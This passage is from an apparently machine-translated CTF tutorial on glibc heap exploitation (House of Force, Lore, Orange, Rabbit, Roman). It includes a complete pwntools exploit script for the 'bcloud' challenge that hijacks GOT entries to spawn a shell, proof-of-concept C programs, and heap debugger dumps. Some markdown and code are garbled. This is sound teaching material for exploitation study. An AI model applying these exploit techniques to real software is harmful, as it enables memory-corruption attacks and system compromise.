addresses.</li> <li>Modify the size of the first three notes to 16, and modify the pointer to free@got, atoni@got, atoni@got</li> <li>Change free@got to puts@plt.</li> <li>Leak the atoi address.</li> <li>Modify another atoi got item to the system address again to get the shell.</li> </ol> <p>The specific script is as follows</p> <pre><code>from pwn import *\n\ncontext.terminal = ['gnome-terminal', '-x', 'sh', '-c']\n\nif args['DEBUG']:\n\n    context.log_level = 'debug'\n\ncontext.binary = \"./bcloud\"\n\nbcloud = ELF (&amp;quot;./ bcloud&amp;quot;)\nif args['REMOTE']:\n\n    p = remote('127.0.0.1', 7777)\n\nelse:\n\n    p = process(\"./bcloud\")\n\nlog.info('PID: ' + str(proc.pidof(p)[0]))\n\nlibc = ELF('./libc.so.6')\n\n\n\n\n\ndef offset_bin_main_arena(idx):\n\n    word_bytes = context.word_size / 8\n\n    offset = 4  # lock\n\n    offset += 4  # flags\n\n    offset += word_bytes * 10  # offset fastbin\n\n    offset += word_bytes * 2  # top,last_remainder\n\n    offset += idx * 2 * word_bytes  # idx\n\n    offset -= word_bytes * 2  # bin overlap\n\n    return offset\n\n\n\n\n\ndef exp():\n\n    # leak heap base\n\n    p.sendafter('Input your name:\\n', 'a' * 64)\n\n    p.recvuntil('Hey ' + 'a' * 64)\n\n    # sub name's chunk' s header\n\n    heap_base = u32(p.recv(4)) - 8\n\n    log.success('heap_base: ' + hex(heap_base))\n\n    p.sendafter('Org:\\n', 'a' * 64)\n\n    p.sendlineafter('Host:\\n', p32(0xffffffff))\n\n    # name,org,host, for each is (0x40+8)\n\n    topchunk_addr = heap_base + (0x40 + 8) * 3\n\n\n\n    # make topchunk point to 0x0804B0A0-8\n\n    p.sendlineafter('option---&gt;&gt;', '1')\n\n    notesize_addr = 0x0804B0A0\n\n    notelist_addr = 0x0804B120\n\n    targetaddr = notesize_addr - 8\n\n    offset_target_top = targetaddr - topchunk_addr\n\n    # 4 for size_t, 7 for malloc_allign\n\n    malloc_size = offset_target_top - 4 - 7\n\n    # plus 4 because malloc(v2 + 4);\n\n    p.sendlineafter('Input the length of the note content:\\n',\n\n                    str(malloc_size - 4))\n\n    # most likely malloc_size-4&lt;0...\n\n    if malloc_size - 4 &gt; 0:\n\n        p.sendlineafter('Input the content:\\n', '')\n\n\n\n    #gdb.attach(p)\n# set notesize [0] = notesize [1] = notesize [2] = 16\n    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got\n\n    p.sendlineafter('option---&gt;&gt;', '1')\n\n    p.sendlineafter('Input the length of the note content:\\n', str(1000))\n\n\n\n    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(\n\n        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2\n\n    p.sendlineafter('Input the content:\\n', payload)\n\n\n\n    # overwrite free@got with puts@plt\n\n    p.sendlineafter('option---&gt;&gt;', '3')\n\n    p.sendlineafter('Input the id:\\n', str(0))\n\n    p.sendlineafter('Input the new content:\\n', p32(bcloud.plt['puts']))\n\n\n\n    # leak atoi addr by fake free\n\n    p.sendlineafter('option---&gt;&gt;', '4')\n\n    p.sendlineafter('Input the id:\\n', str(1))\n\n    atoi_addr = u32(p.recv(4))\n\n    libc_base = atoi_addr - libc.symbols['atoi']\n\n    system_addr = libc_base + libc.symbols['system']\n\n    log.success('libc base addr: ' + hex(libc_base))\n\n\n\n    # overwrite atoi@got with system\n\n    p.sendlineafter('option---&gt;&gt;', '3')\n\n    p.sendlineafter('Input the id:\\n', str(2))\n\n    p.sendlineafter('Input the new content:\\n', p32(system_addr))\n\n\n\n    # get shell\n\n    p.sendlineafter('option---&gt;&gt;', '/bin/sh\\x00')\n\n    p.interactive()\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    exp()\n</code></pre>"},{"location":"pwn/linux/glibc-heap/house_of_force/#topic","title":"topic","text":"<ul> <li>2016 Boston Key Party CTF cookbook</li> </ul>"},{"location":"pwn/linux/glibc-heap/house_of_lore/","title":"House of Lore","text":""},{"location":"pwn/linux/glibc-heap/house_of_lore/#overview","title":"Overview","text":"<p>The House of Lore attack is closely related to the mechanism of Small Bin in Glibc heap management.</p> <p>House of Lore can modify the memory of any address by assigning chunks of any specified location.</p> <p>House of Lore takes advantage of the need to control the bk pointer of Small Bin Chunk and control the fd pointer of the chunk at the specified location.</p>"},{"location":"pwn/linux/glibc-heap/house_of_lore/#fundamental","title":"Fundamental","text":"<p>If at malloc, the requested memory block is in the range of small bin, then the execution process is as follows</p> <pre><code>    /*\n       If a small request, check regular bin.  Since these \"smallbins\"\n       hold one size each, no searching within bins is necessary.\n       (For a large request, we need to wait until unsorted chunks are\n       processed to find best fit. But for small ones, fits are exact\n       anyway, so we can check now, which is faster.)\n     */\n\n    if (in_smallbin_range(nb)) {\n        // Get the index of the small bin\n        idx = smallbin_index(nb);\n        // Get the corresponding chunk pointer in the small bin\n        bin = bin_at (av, idx);\n        // First execute victim= last(bin) to get the last chunk of the small bin\n        // If victim = bin , then the bin is empty.\n        // If they are not equal, then there will be two cases\n        if ((victim = last(bin)) != bin) {\n            // In the first case, the small bin has not yet been initialized.\n            if (victim == 0) /* initialization check */\n                // Perform initialization to merge chunks in fast bins\n                malloc_consolidate (of);\n            // In the second case, there is a free chunk in the small bin\n            else {\n                // Get the second-to-last chunk in the small bin.\n                bck = victim-&gt;bk;\n                // Check if bck-&gt;fd is victim, prevent forgery\n                if (__glibc_unlikely(bck-&gt;fd != victim)) {\n                    errstr = \"malloc(): smallbin double linked list corrupted\";\n                    goto errout;\n                }\n                // Set the corresponding inuse bit of victim\n                set_inuse_bit_at_offset(victim, nb);\n                // Modify the small bin list, take the last chunk of the small bin\n                bin-&gt; bk = bck;\n                bck-&gt;fd = bin;\n                // If it is not main_arena, set the corresponding flag\n                if (av != &amp;main_arena) set_non_main_arena(victim);\n                // Detailed inspection\n                check_malloced_chunk (off, victim, nb);\n                // Convert the requested chunk to the corresponding mem state\n                void *p = chunk2mem(victim);\n                // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff\n                alloc_perturb(p, bytes);\n                return p;\n            }\n        }\n    }\n</code></pre> <p>We can see from this part below</p> <pre><code>                // Get the second-to-last chunk in the small bin.\n                bck = victim-&gt;bk;\n                // Check if bck-&gt;fd is victim, prevent forgery\n                if (__glibc_unlikely(bck-&gt;fd != victim)) {\n                    errstr = \"malloc(): smallbin double linked list corrupted\";\n                    goto errout;\n                }\n                // Set the corresponding inuse bit of victim\n                set_inuse_bit_at_offset(victim, nb);\n                // Modify the small bin list, take the last chunk of the small bin\n                bin-&gt; bk = bck;\n                bck-&gt;fd = bin;\n</code></pre> <p>If we can modify the bk of the last chunk of the small bin to specify the fake chunk of the memory address, and at the same time satisfy the detection of bck-&gt;fd != victim, then we can make the bk of the small bin just construct for us. Fake chunk. In other words, the next time we apply for the small bin, we will assign the fake chunk to the specified location.</p>"},{"location":"pwn/linux/glibc-heap/house_of_lore/#sample-code","title":"Sample Code","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\nvoid jackpot(){ puts(\"Nice jump d00d\"); exit(0); }\n\nint main(int argc, char * argv[]){\n\n\n  intptr_t* stack_buffer_1[4] = {0};\n  intptr_t* stack_buffer_2[3] = {0};\n\n  fprintf(stderr, \"\\nWelcome to the House of Lore\\n\");\n  fprintf(stderr, \"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\");\n  fprintf(stderr, \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\\n\\n\");\n\n  fprintf(stderr, \"Allocating the victim chunk\\n\");\n  intptr_t *victim = malloc(100);\n  fprintf(stderr, \"Allocated the first small chunk on the heap at %p\\n\", victim);\n\n  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk\n  intptr_t *victim_chunk = victim-2;\n\n  fprintf(stderr, \"stack_buffer_1 at %p\\n\", (void*)stack_buffer_1);\n  fprintf(stderr, \"stack_buffer_2 at %p\\n\", (void*)stack_buffer_2);\n\n  fprintf(stderr, \"Create a fake chunk on the stack\");\n  fprintf(stderr, \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\"\n         \"in second to the last malloc, which putting stack address on smallbin list\\n\");\n  stack_buffer_1[0] = 0;\n  stack_buffer_1[1] = 0;\n  stack_buffer_1[2] = victim_chunk;\n\n  fprintf(stderr, \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \"\n         \"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \"\n         \"chunk on stack\");\n  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;\n  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;\n\n  fprintf(stderr, \"Allocating another large chunk in order to avoid consolidating the top chunk with\"\n         \"the small one during the free()\\n\");\n  void *p5 = malloc(1000);\n  fprintf(stderr, \"Allocated the large chunk on the heap at %p\\n\", p5);\n\n\n  fprintf(stderr, \"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\", victim);\n  free((void*)victim);\n\n  fprintf(stderr, \"\\nIn the unsorted bin the victim's fwd and bk pointers are nil\\n\");\n  fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]);\n  fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]);\n\n  fprintf(stderr, \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\");\n  fprintf(stderr, \"This means that the chunk %p will be inserted in front of the SmallBin\\n\", victim);\n\n  void *p2 = malloc(1200);\n  fprintf(stderr, \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\", p2);\n\n  fprintf(stderr, \"The victim chunk has been sorted and its fwd and bk pointers updated\\n\");\n  fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]);\n  fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]);\n\n  //------------VULNERABILITY-----------\n\n  fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n\");\n\n  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack\n\n  //------------------------------------\n\n  fprintf(stderr, \"Now allocating a chunk with size equal to the first one freed\\n\");\n  fprintf(stderr, \"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n\");\n\n  void *p3 = malloc(100);\n\n\n  fprintf(stderr, \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n\");\n  char *p4 = malloc(100);\n  fprintf(stderr, \"p4 = malloc(100)\\n\");\n\n  fprintf(stderr, \"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\",\n         stack_buffer_2[2]);\n\n  fprintf(stderr, \"\\np4 is %p and should be on the stack!\\n\", p4); // this chunk will be allocated on stack\n  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode\n  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary\n}\n</code></pre> <p>The above code has been made very clear and will not be explained.</p> <p>** But what needs to be noted is: **</p> <ol> <li> <p><code>void *p5 = malloc(1000);</code> is to prevent merge with top_chunk after victim_chunk.</p> </li> <li> <p><code>free((void*)victim)</code>, victim will be put into the unsort bin, and if the size of the next allocation is larger than this, the corresponding size will be allocated from the top chunk, and the chunk will be Remove the link to the appropriate bin. If it is smaller than this (equal returns directly), the corresponding size is cut off from the chunk, and the corresponding chunk is returned, and the rest becomes the last reminder chunk, or there is an unsorted bin.</p> </li> </ol>"},{"location":"pwn/linux/glibc-heap/house_of_lore/#references","title":"references","text":"<ul> <li>https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c</li> </ul>"},{"location":"pwn/linux/glibc-heap/house_of_orange/","title":"House of Orange","text":""},{"location":"pwn/linux/glibc-heap/house_of_orange/#introduction","title":"Introduction","text":"<p>House of Orange differs from other House of XX methods in that it comes from a topic of the same name in Hitcon CTF 2016. Since this method of utilization has not appeared in the previous CTF topic, the use of a series of derivative topics that emerged later is called House of Orange.</p>"},{"location":"pwn/linux/glibc-heap/house_of_orange/#overview","title":"Overview","text":"<p>The use of House of Orange is quite special. First, the target vulnerability is a vulnerability on the heap. But the special thing is that there is no free function or other function that releases the heap block. We know that you generally want to use heap vulnerabilities, you need to perform malloc and free operations on the heap, but you can't use the free function in House of Orange utilization, so the House of Orange core is free to exploit the exploit.</p>"},{"location":"pwn/linux/glibc-heap/house_of_orange/#principle","title":"Principle","text":"<p>As we mentioned earlier, the core of House of Orange is to get a free unsorted bin without a free function. The principle of this operation is simply that when the top heap size of the current heap is insufficient to meet the size of the application allocation, the original top chunk will be released and placed in the unsorted bin. This can be done without the free function. Get unsorted bins.</p> <p>Let's take a look at the details of this process. Let's assume that the current top chunk does not meet the allocation requirements of malloc. First, the <code>malloc</code> call in the program will be executed into the <code>_int_malloc</code> function of libc.so. In the <code>_int_malloc</code> function, we will check whether the fastbin, small bins, unsorted bin, and large bins can meet the allocation requirements. Size issues are not met. Next, the <code>_int_malloc</code> function will attempt to use the top chunk, where the top chunk will not meet the allocation requirements, so the following branch will be executed.</p> <pre><code>/*\nOtherwise, relay to handle system-dependent cases\n*/\nelse {\n      void * p = sysmalloc (nb, av);\n      if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0))\n        alloc_perturb (p, bytes);\n      return p;\n}\n</code></pre> <p>At this point ptmalloc can not meet the user's request for heap memory operations, you need to execute sysmalloc to apply for more space to the system. But for the heap there are two distribution methods of mmap and brk, we need to make the heap expand in the form of brk, then the original top chunk will be placed in the unsorted bin.</p> <p>In summary, we have to implement brk to extend the top chunk, but to achieve this goal we need to bypass some checks in libc. First, the size of malloc cannot be greater than <code>mmp_.mmap_threshold</code> <pre><code>if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))\n</code></pre></p> <p>If the chunk size to be allocated is greater than the mmap allocation threshold, the default is 128K, and the memory block allocated by the current process using mmap() is less than the set maximum value, and the mmap() system call will be used to directly request memory from the operating system.</p> <p>There is a check for the top chunk size in the sysmalloc function, as follows</p> <pre><code>assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||\n     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;\n      prev_inuse(old_top) &amp;&amp;\n      ((unsigned long)old_end &amp; pagemask) == 0));\n</code></pre> <p>This checks the legitimacy of the top chunk. If this function is called for the first time, the top chunk may not be initialized, so the old_size may be 0. If the top chunk has already been initialized, then the size of the top chunk must be greater than or equal to MINSIZE, because the top chunk contains fencepost, so the top chunk must be larger than MINSIZE. Second, the top chunk must identify that the previous chunk is in the inuse state, and the end chunk's end address must be page-aligned. In addition, the top chunk removes the fencepost size must be smaller than the required chunk size, otherwise the top chunk will be used to split the chunk in the _int_malloc() function.</p> <p>Let's summarize the requirements for forged top chunk size</p> <ol> <li>Forged size must be aligned to the memory page</li> <li>size is greater than MINSIZE (0x10)</li> <li>size is smaller than the chunk size + MINSIZE (0x10) applied afterwards</li> <li>The prev inuse bit of size must be 1</li> </ol> <p>After that, the original top chunk will execute <code>_int_free</code> and smoothly enter the unsorted bin.</p>"},{"location":"pwn/linux/glibc-heap/house_of_orange/#example","title":"example","text":"<p>Here is a sample program that simulates an overflow overlay to the size field of the top chunk. We tried to reduce the size to achieve the brk extension and put the original top chunk into the unsorted bin.</p> <pre><code>#define fake_size 0x41\n\nint main(void)\n{\n    void * ptr;\n\n    ptr = malloc (0x10);\n    ptr = (void *) ((int) ptr + 24);\n    *((long long*)ptr)=fake_size; // overwrite top chunk size\n\n    malloc(0x60);\n\n    malloc(0x60);\n}\n</code></pre> <p>Here we cover the size of the top chunk as 0x41. Then apply for a heap larger than this size, which is 0x60. But when we execute this example, we find that this program can't be used successfully because the assert is not satisfied and throws an exception.</p> <pre><code>[#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6)\n[#1] 0x7ffff7a4402a \u2192 Name: __GI_abort()\n[#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150 \"(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)\", file=0x7ffff7b9ab85 \"malloc.c\", line=0x95a, function=0x7ffff7b9e998 &lt;__func__.11509&gt; \"sysmalloc\")\n[#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc (nb = 0x70, av = 0x7ffff7dd1b20 &lt;main_arena&gt; )\n</code></pre>"},{"location":"pwn/linux/glibc-heap/house_of_orange/#the-correct-example","title":"The correct example","text":"<p>Looking back at the conditions of the assert, we can see that the previously listed entries are satisfied except for the first one.</p> <pre><code>1. Forged size must be aligned to the memory page\n</code></pre> <p>What is alignment to a memory page? We know that modern operating systems are memory managed in units of memory pages. The size of a typical memory page is 4 kb. Then our forged size must be aligned to this size. The size of the top chunk before the overlay is 20fe1, and it is calculated that 0x602020+0x20fe0=0x623000 is aligned for 0x1000 (4kb).</p> <pre><code>0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>Therefore, our fake fake_size can be 0x0fe1, 0x1fe1, 0x2fe1, 0x3fe1, etc. for 4kb aligned size. However, 0x40 does not satisfy the alignment, so it cannot be utilized.</p> <pre><code>#define fake_size 0x1fe1\n\nint main(void)\n{\n    void * ptr;\n\n    ptr = malloc (0x10);\n    ptr = (void *) ((int) ptr + 24);\n\n    *((long long*)ptr)=fake_size;\n\n    malloc(0x2000);\n\n    malloc(0x60);\n}\n</code></pre> <p>After the allocation, we can observe that the original heap has passed the brk extension.</p> <pre><code>//The original heap\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n//The extended heap\n0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]\n</code></pre> <p>Our application was assigned to 0x623010 and the original heap was placed in the unsorted bin</p> <pre><code>[+] unsorted_bins[0]: fw=0x602020, bk=0x602020\n \u2192   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)\n</code></pre> <p>Because there is a block in the unsorted bin, we will cut this block the next time we allocate it.</p> <pre><code> malloc(0x60);\n 0x602030\n\n[+] unsorted_bins[0]: fw=0x602090, bk=0x602090\n \u2192   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)\n</code></pre> <p>You can see that the allocated memory is cut from the unsorted bin, the memory layout is as follows</p> <pre><code>0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 &lt;== Unsorted bin list not cleared\n0x602040:   0x0000000000602020  0x0000000000602020\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000001f51 &lt;== cutting the remaining new unsorted bin\n0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6020b0:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>In fact, the main point of the house of orange is here, after the use of _IO_FILE knowledge, put it in the IO_FILE independent chapter to share.</p>"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/","title":"House of Rabbit","text":""},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#introduction","title":"Introduction","text":"<p>House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization.</p>"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#principle","title":"Principle","text":"<p>We know that fastbin will use the same size of the released heap block to manage with a singly linked list, the allocation will check whether the size is reasonable, if it is unreasonable, the program will exit abnormally. The house of rabbit uses the heap blocks in the fastbin at malloc consolidate to merge and the size is not checked to forge a fake heap to prepare for further utilization.</p> <p>Since the original author's [POC] (https://github.com/shift-crops/House_of_Rabbit) requires more conditions, here I directly introduce the nature of this attack.</p> <p><code>Prerequisites</code>: 1. You can modify the fastbin fd pointer or size 2. Can trigger malloc consolidate (merge top or malloc big chunk, etc.)</p> <p>Let\u2019s take a look at POC <code>POC 1</code>: modify the size of fastbin chunk</p> <p><code>`</code>Cpp unsigned long* chunk1=malloc(0x40); //0x602000</p> <p>unsigned long* chunk2=malloc(0x40); //0x602050</p> <p>malloc(0x10);</p> <p>free(chunk1);</p> <p>free(chunk2);</p> <p>/* Heap layout</p> <p>0000| 0x602000 \u2192 0x0 </p> <p>0008| 0x602008 \u2192 0x51 ('Q')</p> <p>0016| 0x602010 \u2192 0x0 </p> <p>..... </p> <p>0080| 0x602050 \u2192 0x0 </p> <p>0088| 0x602058 \u2192 0x51 ('Q')</p> <p>0096| 0x602060 \u2192 0x602000 \u2192 0x0 </p> <p>0104| 0x602068 \u2192 0x0 </p> <p>...... </p> <p>0160| 0x6020a0 \u2192 0x0 </p> <p>0168| 0x6020a8 \u2192 0x21 ('!')</p> <p>0176| 0x6020b0 \u2192 0x0 </p> <p>0184| 0x6020b8 \u2192 0x0 </p> <p>*/</p> <p>chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1</p> <p>malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate</p> <p>/*Chunk1 overlap with chunk2 now</p> <p>gdb-peda$ telescope 0x602000 100</p> <p>0000| 0x602000 \u2192 0x0 </p> <p>0008| 0x602008 \u2192 0xa1 </p> <p>0016| 0x602010 \u2192 0x7ffff7dd1c08 \u2192 0x7ffff7dd1bf8 \u2192 0x7ffff7dd1be8 \u2192 0x7ffff7dd1bd8 \u2192 0x7ffff7dd1bc8 (\u2192 ...)</p> <p>0024| 0x602018 \u2192 0x7ffff7dd1c08 \u2192 0x7ffff7dd1bf8 \u2192 0x7ffff7dd1be8 \u2192 0x7ffff7dd1bd8 \u2192 0x7ffff7dd1bc8 (\u2192 ...)</p> <p>0032| 0x602020 \u2192 0x0 </p> <p>.....</p> <p>0080| 0x602050 \u2192 0x0 </p> <p>0088| 0x602058 \u2192 0x51 ('Q')</p> <p>0096| 0x602060 \u2192 0x7ffff7dd1bb8 \u2192 0x7ffff7dd1ba8 \u2192 0x7ffff7dd1b98 \u2192 0x7ffff7dd1b88 \u2192 0x7ffff7dd1b78 (\u2192 ...)</p> <p>0104| 0x602068 \u2192 0x7ffff7dd1bb8 \u2192 0x7ffff7dd1ba8 \u2192 0x7ffff7dd1b98 \u2192 0x7ffff7dd1b88 \u2192 0x7ffff7dd1b78 (\u2192 ...)</p> <p>0112| 0x602070 \u2192 0x0 </p> <p>0120| 0x602078 \u2192 0x0 </p> <p>....</p> <p>0152| 0x602098 \u2192 0x0 </p> <p>0160| 0x6020a0 \u2192 0xa0 </p> <p>0168| 0x6020a8 \u2192 0x20 (' ')</p> <p>gdb-peda $ heapinfo (0x20)     fastbin[0]: 0x0</p> <p>(0x30)     fastbin[1]: 0x0</p> <p>(0x40)     fastbin[2]: 0x0</p> <p>(0x50)     fastbin[3]: 0x0</p> <p>(0x60)     fastbin[4]: 0x0</p> <p>(0x70)     fastbin[5]: 0x0</p> <p>(0x80)     fastbin[6]: 0x0</p> <pre><code>              top: 0x603450 (size : 0x1fbb0)\n\n   last_remainder: 0x0 (size : 0x0)\n\n        unsortbin: 0x0\n</code></pre> <p>(0x050)  smallbin[ 3]: 0x602050</p> <p>(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )</p> <p>*/</p> <pre><code>`POC 2`:modify FD pointer\n\n`` `Cpp\nunsigned long* chunk1=malloc(0x40); //0x602000\n\nunsigned long* chunk2=malloc(0x100);//0x602050\n\n\n\nchunk2[1]=0x31; //fake chunk size 0x30\n\nchunk2[7]=0x21  //fake chunk's next chunk\n\nchunk2[11]=0x21 //fake chunk's next chunk's next chuck\n\n/ * Heap laylout\n0000| 0x602000 --&gt; 0x0 \n\n0008| 0x602008 --&gt; 0x51 ('Q')\n\n0016| 0x602010 --&gt; 0x0 \n\n......\n\n0080| 0x602050 --&gt; 0x0 \n\n0088| 0x602058 --&gt; 0x111 \n\n0096| 0x602060 --&gt; 0x0 \n\n0104| 0x602068 --&gt; 0x31 ('1')\n\n0112| 0x602070 --&gt; 0x0 \n\n......\n\n0144| 0x602090 --&gt; 0x0 \n\n0152| 0x602098 --&gt; 0x21 ('!')\n\n0160| 0x6020a0 --&gt; 0x0 \n\n0168| 0x6020a8 --&gt; 0x0 \n\n0176| 0x6020b0 --&gt; 0x0 \n\n0184| 0x6020b8 --&gt; 0x21 ('!')\n\n0192| 0x6020c0 --&gt; 0x0 \n\n......\n\n0352| 0x602160 --&gt; 0x0 \n\n0360| 0x602168 --&gt; 0x20ea1\n\n*/\n\nfree(chunk1);\n\nchuck1[0]=0x602060;// modify the fd of chunk1\n\n/*\n\ngdb-peda $ heapinfo\n(0x20)     fastbin[0]: 0x0\n\n(0x30)     fastbin[1]: 0x0\n\n(0x40)     fastbin[2]: 0x0\n\n(0x50)     fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0\n\n*/\n\nmalloc(5000);// malloc a  big chunk to trigger malloc consolidate\n\n/*\n\ngdb-peda $ heapinfo\n(0x20)     fastbin[0]: 0x0\n\n(0x30)     fastbin[1]: 0x0\n\n(0x40)     fastbin[2]: 0x0\n\n(0x50)     fastbin[3]: 0x0\n\n(0x60)     fastbin[4]: 0x0\n\n(0x70)     fastbin[5]: 0x0\n\n(0x80)     fastbin[6]: 0x0\n\n                  top: 0x6034f0 (size : 0x1fb10) \n\n       last_remainder: 0x0 (size : 0x0) \n\n            unsortbin: 0x0\n\n(0x050)  smallbin[ 3]: 0x602000\n(0x030)  smallbin[ 1]: 0x602060\n\n*/\n</code></pre> <p>The principle is very simple, is to modify the size of the fastbin chunk (as shown in POC 1 above) to directly construct the overlap chunk, or modify the fd (as shown by POC 2), let it point to a fake chunk, trigger malloc consolidate and let This fake chunk becomes a legal chunk.</p>"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#to-sum-up","title":"to sum up","text":"<p>The advantage of House of Rabbit is that it is easy to construct an overlap chunk. Since it can be based on fastbin attack, even leak can be used to complete the attack. You can deepen your understanding of this attack through the exercises of the examples.</p>"},{"location":"pwn/linux/glibc-heap/house_of_rabbit/#example","title":"Example","text":"<ol> <li> <p>HITB-GSEC-XCTF 2018 mutepig</p> </li> <li> <p>To be added</p> </li> </ol>"},{"location":"pwn/linux/glibc-heap/house_of_roman/","title":"House of Roman","text":""},{"location":"pwn/linux/glibc-heap/house_of_roman/#introduction","title":"Introduction","text":"<p>House of Roman This trick is simply a small trick combined with fastbin attack and Unsortbin attack.</p>"},{"location":"pwn/linux/glibc-heap/house_of_roman/#summary","title":"Summary","text":"<p>This technique is used for bypass ALSR, which uses a 12-bit burst to achieve the shell. It can be exploited with just one UAF vulnerability and the ability to create chunks of any size.</p>"},{"location":"pwn/linux/glibc-heap/house_of_roman/#principle-and-display","title":"Principle and display","text":"<p>The author provided us with a demo for display, and the entire process can be divided into three steps.</p> <ol> <li>Point FD to malloc_hook</li> <li>Fix 0x71 Freelist</li> <li>Write one gadget to malloc_hook</li> </ol> <p>First a rough analysis of the demo:</p> <p>Open protection:</p> <pre><code>[*] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n</code></pre> <p>There are three main functions in the sample question, Malloc, Write, and Free.</p> <pre><code>    switch ( v4 )\n    {\n      case 1:\n        puts(\"Malloc\");\n        v5 = malloc_chunk(\"Malloc\");\n        if ( !v5 )\n          puts(\"Error\");\n        break;\n      case 2:\n        puts(\"Write\");\n        write_chunk(\"Write\");\n        break;\n      case 3:\n        puts(\"Free\");\n        free_chunk();\n        break;\n      default:\n        puts(\"Invalid choice\");\n        break;\n</code></pre> <p>In the Free function, there is a dangling pointer caused by the pointer not being zeroed.</p> <pre><code>void free_chunk()\n{\n  unsigned int v0; // [rsp+Ch] [rbp-4h]@1\n\n  printf (\"Next index:\");\n  __isoc99_scanf(\"%d\", &amp;v0);\n\n  if ( v0 &lt;= 0x13 )\n    free(heap_ptrs[(unsigned __int64)v0]);\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/house_of_roman/#step-1","title":"Step 1","text":"<p>First fake a chunk, the size of the chunk is 0x61. Then we use partial overwrite to point the FD to the forged chunk (of course, we can also do this with UAF).</p> <p>Forged chunk size</p> <pre><code>pwndbg&gt;\n0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141\n0x555555757090: 0x41414141      0x41414141      0x61    0x0     &lt;----------\n</code></pre> <p>Here, we are free of chunk 1, this time we can get an unsortbin</p> <pre><code>0x555555757020 PREV_INUSE {\n  prev_size = 0x0,\n  size = 0xd1,\n  fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt; ,\n  bk = 0x7ffff7dd1b58 &lt;main_arena+88&gt; ,\n  fd_nextsize = 0x4141414141414141,\n  bk_nextsize = 0x4141414141414141\n}\n</code></pre> <p>Next, we redistribute the chunk 0xd1 and modify its size to 0x71.</p> <pre><code>pwndbg&gt; x/40ag 0x555555757020\n0x555555757020: 0x4141414141414141      